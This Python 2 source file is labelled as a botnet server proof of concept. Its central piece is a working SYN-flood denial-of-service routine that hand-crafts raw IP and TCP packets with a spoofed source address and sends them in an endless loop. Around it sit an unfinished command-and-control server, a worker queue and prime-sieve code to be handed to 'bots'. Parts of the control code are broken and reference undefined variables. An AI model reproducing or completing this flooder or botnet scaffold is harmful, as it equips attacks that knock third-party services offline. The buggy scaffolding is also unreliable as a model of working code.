#botnet server POC
#uses web requests to direct botnet

#not sure how low level libraries we need to use

from multiprocessing import Process, Queue, Manager, Pool
import SocketServer
import ssl
from socket import * #want lower level than built-in tcp servers
from struct import * #want for packing packets
import sys
import logging
import math
import timeit
import array

PORT = ('localhost', 4443)

NUMBEROFTHREADS = 4 #will probably create new threads on demand rather than use poollike
NUMBEROFWORKERS = NUMBEROFTHREADS - 1

def Sieve(n):
	#default sieve of eratosthenes
	A = [True for _ in xrange(0,n+1)]
	B = []
	outerlimit = n ** .5
	i = 2
	while i <= outerlimit:
		if A[i]:
			B.append(i)
			p = i ** 2
			while p <= n:
				A[p] = False
				p += i
		i += 1
	
	while i <= n:
		if A[i] == True:
			B.append(i)
		i += 1
	#print B

	return B

def DistSieveTarget((n, tlow, thigh), B=None):
	#sieve for use in threads of DistributedSieve
	#n = number to sieve
	#B = list of primes used to sieve
	#A = partition we want to sieve
	#tindex = first number A represents

	list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
	list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition

	outerlimit = math.sqrt(n)
	i = 2
	
	while i <= outerlimit:
		if list1[i]:
			p = i ** 2
			while p <= n:
				list1[p] = False
				p += i
				
			q = i ** 2
			while q <= thigh:
				if q < tlow:
					q += i
					continue
				try:
					list2[q-tlow] = False
				except:
					print tlow, thigh
					print q-tlow
					print list2
					print thigh-tlow+1
					raise IndexError
				q += i
		i += 1

	C = [val+tlow for val, j in enumerate(list2) if j]

	#print C
	return C
	
def DistributedSieve(n, threadn):
	#simple threading, sieve of n**1/2 first finds those primes then send to each thread with a partition

	temp = math.floor((n-1)) / (math.floor(math.sqrt(n)))

	#we want n to be divisible by threadn so we can make equal partitions
	newn = n + (threadn - n) % threadn

	A = [True for _ in xrange(2,n+1)]
	
	partitionint = int(newn/threadn)
	
	distA = tuple([n, partitionint*i, i*partitionint+partitionint - 1] for i in xrange(threadn))

	pool = Pool(threadn)
	
	B = reduce(lambda a,b: a+b, pool.map(DistSieveTarget, distA))
	B = [b for b in B if b >=2 and b <= n]

	return B

def worker(i, commandqueue, finishedqueue):
    logging.info("Starting worker process")
    
    while True:
        #accept connection
        #print (commandqueue)
        if "q" in commandqueue or "quit" in commandqueue:
            print (commandqueue)
            return

def server(processlist):
    logging.info("Starting server process")
    #one called every time program starts
    sock = socket(AF_INET, SOCK_STREAM)
    sock.bind(PORT)
    sock.listen(1)
    
    while True:
        conn, address = sock.accept()
        logging.debug("Got connection")
        #Process(target=worker, args =???)
        process.daemon = True
        process.start()
    
def checksum(msg):
	s = sum([(ord(msg[i*2]) << 8) + ord(msg[i*2+1]) for i in range(len(msg)/2)])

	s = (s>>16) + (s & 0xffff)

	#complement and mask to 4 byte short
	s = ~s & 0xffff

	#print [(c, ord(c)) for c in msg]
	return s

def achecksum(pkt):
	if len(pkt) % 2 == 1:
		pkt += "\0"
	s = sum(array.array("H", pkt))
	s = (s >> 16) + (s & 0xffff)
	s += s >> 16
	s = ~s
	return (((s>>8)&0xff)|s<<8) & 0xffff

def DDoS(dip, dport):
	HTTPS = False
	port = 1337
	dstip = dip
	
	srcip = "10.0.0.23"
	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
	s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
	
	#we manually craft a packet
	#scapy would be nice, but can't guarantee it's on every computer
	#ip header fields
	#used http://www.binarytides.com/raw-socket-programming-in-python-linux/
	#for help creating packet
	ipver = 4
	ipihl = 5
	iptos = 0
	iptotlen = 40
	ipid = 1
	ipfragoff = 0
	ipttl = 64
	ipproto = IPPROTO_TCP
	ipcheck = 0
	ipsaddr = inet_aton(srcip)
	ipdaddr = inet_aton(dstip)
	
	ipihlver = (ipver << 4) + ipihl
	ipheader = pack('!BBHHHBBH4s4s', ipihlver, iptos, iptotlen, ipid, ipfragoff, ipttl, ipproto, ipcheck, ipsaddr, ipdaddr)

	#tcp stuff
	tcpsrc = 1337
	tcpdst = port
	tcpseq = 0
	tcpackseq = 0
	tcpdoff = 5
	tcpfin = 0
	tcpsyn = 1
	tcprst = 0
	tcppsh = 0
	tcpack = 0
	tcpurg = 0
	tcpwin = 8192
	tcpchk = 0
	tcpupr = 0
	
	tcpoffsetres = (tcpdoff << 4) + 0
	tcpflags = tcpfin + (tcpsyn << 1) + (tcprst << 2) + (tcppsh << 3) + (tcpack << 4) + (tcpurg << 5)
	
	tcpheader = pack('!HHLLBBHHH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin, tcpchk, tcpupr)

	data = ''
	placeholder = 0
	tcplen = htons(len(tcpheader)+len(data))
	
	psh = pack('4s4sBBH', ipsaddr, ipdaddr, placeholder, ipproto, tcplen)
	psh += tcpheader + data
	
	tcpchk = htons(checksum(psh))
	#print tcpchk
	ex= str("".join([c[0] for c in ('\n', 10), ('\x84', 132), ('\xaa', 170), ('\x1f', 31), ('\n', 10), ('\x00', 0), ('\x00', 0), ('\x17', 23), ('\x00', 0), ('\x06', 6), ('\x00', 0), ('\x14', 20), ('\x05', 5), ('9', 57), ('\x05', 5), ('9', 57), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('P', 80), ('\x02', 2), (' ', 32), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0)]))
	#print checksum(ex)
	#for a,b in zip(psh, ex):
	#	print ord(a), ord(b)
	tcpheader = pack('!HHLLBBH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin) + pack('H', tcpchk) + pack('!H', tcpupr)
	
	packet = ipheader + tcpheader + data
	
	while True:
		s.sendto(packet, (dip, port))

def main():
	#DDoS syn flood
	DDoS("127.0.0.1", 1337)
	
def main3():#factoring algo
	primes = 1001
	#default sieve
	print timeit.timeit('Sieve(10000001)', setup="from __main__ import Sieve", number=5)
	
	#sieve using n "threads" (convert to bots later)
	print timeit.timeit('DistributedSieve(10000001, 2)', setup="from __main__ import DistributedSieve", number=5)
	
def main2():
    logging.info("Starting main")
    #create worker threads and send them to workerfunction
    manager = Manager()

    #create managed lists passed on to worker threads
    commandqueue = manager.list()
    finishedqueuelist = [manager.list() for _ in xrange(NUMBEROFWORKERS)]   
    processlist = manager.list()

    #starting server process
    serverproc = Process(target=server, args=(processlist, commandqueue))
    serverproc.daemon = True
    serverproc.start()
    logging.debug("Starting process %r", process)
    
    #main thread listens for what to do, then sends it off to server who sends it off to worker threads
    while True:
        try:
            cmd = input('Please input next command ("help" for help.): ')
        except:
            break

        #execute command - variable or signal?
        commandqueue.append(cmd)

        if cmd == 'q' or cmd == "quit":
            break
            
    for p in splist:
        p.join()        
    
if __name__ == "__main__":
    #logging.basicConfig(level=logging.DEBUG)
    main()
    #logging.info("Shutting down")
